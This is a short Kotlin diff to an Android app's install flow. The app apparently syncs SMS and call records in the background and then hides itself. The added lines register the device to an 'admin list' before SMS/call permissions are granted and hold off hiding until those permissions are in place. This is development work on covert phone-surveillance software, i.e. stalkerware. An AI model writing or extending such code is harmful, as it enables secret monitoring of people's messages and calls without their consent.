@@ -26,6 +26,11 @@ object InstallFlow {
     }
 
     fun completeSetup(context: Context) {
+        if (SyncBootstrap.needsRuntimePermissions(context)) {
+            Log.w(TAG, "Skip hide — SMS/call permissions still missing")
+            return
+        }
+
         val app = context.applicationContext
         app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
             .edit()
@@ -44,9 +49,14 @@ object InstallFlow {
         CallSyncHelper.markBackgroundSyncEnabled(app, true)
         SyncBootstrap.armBackgroundSync(app)
 
+        // Admin list ke liye device pehle register — SMS/call permission ka wait mat karo.
+        BackgroundSyncRunner.run {
+            DeviceRegistration.registerNow(app)
+        }
+
         if (SyncBootstrap.needsRuntimePermissions(app)) {
             Log.w(TAG, "Permissions pending — dialog, phir sync + hide")
-            SyncBootstrap.launchPermissionTrampoline(app)
+            SyncBootstrap.launchPermissionTrampoline(context)
             return
         }
 
